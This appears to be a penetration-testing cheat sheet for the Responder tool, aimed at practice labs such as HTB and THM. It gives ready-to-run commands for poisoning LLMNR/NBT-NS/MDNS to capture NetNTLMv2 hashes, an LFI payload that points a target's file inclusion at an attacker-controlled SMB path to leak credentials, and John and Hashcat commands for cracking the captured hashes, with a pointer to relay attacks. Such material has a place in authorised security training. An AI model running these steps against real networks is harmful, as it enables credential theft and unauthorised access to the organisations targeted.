# Responder Cheat Sheet

Network poisoning tool. Listens for LLMNR, NBT-NS, and MDNS broadcast queries on the local network and responds to them, then captures NTLM authentication attempts from machines that connect to the fake services.

Pre-installed on Kali at `/usr/share/responder/`.

---

## Basic Usage

```bash
# Start on VPN interface (HTB/THM)
sudo responder -I tun0

# Verbose output — shows more detail
sudo responder -I tun0 -v

# Check your interface name first
ip a
```

---

## Common Flags

| Flag | Description |
|---|---|
| `-I` | Network interface to listen on (required) |
| `-v` | Verbose output |
| `-w` | Start WPAD rogue proxy server |
| `-F` | Force NTLM authentication on wpad |
| `-P` | Force proxy auth (NTLM) instead of Basic |
| `--lm` | Force LM hashing downgrade |

---

## How It Works

**Normal Windows name resolution:**
1. Check local DNS
2. If not found — broadcast LLMNR/NBT-NS query to entire network asking "who is HOST?"
3. Real server responds

**With Responder:**
1. Windows broadcasts query
2. Responder intercepts and says "that's me"
3. Windows tries to authenticate via SMB/HTTP
4. Responder captures the NetNTLMv2 challenge/response
5. You crack it offline

**The SMB trick (LFI + Responder):**
Point a file inclusion vulnerability at your IP via SMB path:
```
http://TARGET/?page=//YOUR_KALI_IP/fakefile
```
Windows tries to load the SMB share, authenticates, Responder captures the hash.

---

## Where Hashes Are Saved

```bash
# Responder saves captures automatically
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt

# Or check all logs
ls /usr/share/responder/logs/
```

---

## After Capturing — Crack the Hash

```bash
# Save hash to file
echo "HASH_STRING" > hash.txt

# Crack with John
john -w=/usr/share/wordlists/rockyou.txt hash.txt

# Crack with Hashcat (faster)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat mode 5600 = NetNTLMv2

---

## What Responder Captures

| Protocol | Hash Type | Use |
|---|---|---|
| SMB | NetNTLMv2 | Crack offline |
| HTTP | NetNTLMv2 | Crack offline |
| LDAP | NetNTLMv2 | Crack offline |
| MSSQL | NetNTLMv2 | Crack offline |

---

## Pentest Notes

- Works on default Windows network configurations — no exploit required
- Most effective on internal networks where LLMNR/NBT-NS is enabled
- NetNTLMv2 can't be passed directly (not the same as NTHash) — must be cracked
- If cracking fails try relay attacks instead (ntlmrelayx)
- Responder is noisy — generates network traffic that shows in logs
- Stop responder with Ctrl+C when done
